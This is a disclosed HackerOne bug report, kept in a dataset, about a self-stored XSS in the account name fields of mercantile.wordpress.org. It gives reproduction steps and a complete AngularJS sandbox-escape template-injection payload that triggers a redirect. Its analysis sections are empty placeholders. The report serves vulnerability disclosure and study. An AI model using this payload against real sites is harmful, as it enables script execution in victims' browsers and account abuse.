---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '222224'
original_report_id: '222224'
title: Stored but [SELF] XSS in mercantile.wordpress.org
weakness: Cross-site Scripting (XSS) - Stored
team_handle: wordpress
created_at: '2017-04-19T18:48:08.590Z'
disclosed_at: '2017-05-26T18:46:44.901Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# Stored but [SELF] XSS in mercantile.wordpress.org

## Metadata

- HackerOne Report ID: 222224
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: wordpress
- Disclosed At: 2017-05-26T18:46:44.901Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi Wordpress and to Iandunn

   This was what I am talking about lately so I will go up straight on how to reproduce it.

###Steps to Reproduce
1. Go to mercantile.wordpress.org //make sure to have an account for this test :D 
2. Hover on *Account Details* `/my-account/edit-account/` 
3. In `First Name` and `Last Name` copy and paste this payload: 
`{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,$location.path('http://example.com/)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}` after that save it
4. After saving it refresh the browser and the xss will trigger with the domain in it.

 Upon registration of accounts it restricts symbols for the fields in `First Name` and `Last Name` but after being registered we can easily edit it here to inject some good payloads

Kind Regards,
Tom

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
